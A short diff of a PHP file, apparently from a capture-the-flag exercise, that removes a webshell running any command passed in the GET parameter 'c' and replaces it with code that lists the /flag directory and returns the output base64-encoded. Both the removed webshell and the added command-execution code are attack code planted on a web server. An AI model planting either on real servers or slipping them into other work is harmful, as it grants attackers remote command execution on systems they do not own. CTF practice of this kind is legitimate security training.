@@ -1,3 +1,4 @@
 <?php
-// simple webshell: ejecuta el comando recibido por GET 'c' y lo imprime
-echo shell_exec($_GET['c']);
+// list /flag directory and return base64 to avoid content-type issues
+$out = shell_exec('ls -la /flag 2>&1');
+echo base64_encode($out);
